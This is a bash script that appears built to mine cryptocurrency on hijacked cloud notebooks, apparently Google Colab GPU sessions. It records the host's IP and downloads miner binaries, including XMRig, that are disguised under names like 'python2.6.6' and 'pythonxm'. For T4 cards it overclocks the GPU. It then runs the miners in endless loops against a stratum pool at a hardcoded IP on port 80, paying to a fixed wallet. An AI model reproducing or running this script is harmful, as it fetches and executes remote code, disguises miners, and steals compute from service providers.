#!bin/bash -xe 

## getting IP info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io

echo '#######################################################'
echo '##################### Test N 41 ########################'
echo '#######################################################'

rm -rf python2.6.6
rm -rf pythonoc
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
chmod +x python2.6.6
cp python2.6.6 pythonoc

#### Clean logs
echo > cuout
echo > ocout
echo > ocoutdef
echo > oout
echo > oout
echo > results.txt 

########## XMR
rm -rf pythonxm
rm -rf config3.json
rm -rf x.out

# Prepare
wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
chmod +x pythonxm
wget -q https://github.com/one10001/10001code/raw/main/config3.json
sed -i "s+ip0001+COLAB_$IPNAME+g" config3.json



if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
then
    while true
    do 
        date 
        nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_CU_P100_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
        #nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_OC_P100_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
        nohup ./pythonxm -c config3.json 2>> oout 1>> oout &
        tail -f oout
   done

elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
then
    echo '................... PARAM T4 ...................................'
    nvidia-smi -pm ENABLED -i 0
    nvidia-smi -ac 5002,1592
    while true
    do
        date 
        nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_CU_T4_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
        nohup ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_OC_T4_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
        nohup ./pythonxm -c config3.json 2>> oout 1>> oout &
        tail -f oout
    done
else
    while true
    do
        date 
        nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_CU_Other_$IPNAME@116.203.10.54:80  -U 2>> oout 1>> oout &
        nohup ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_OC_Other_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
        nohup ./pythonxm -c config3.json 2>> oout 1>> oout &
        tail -f oout
    done
fi
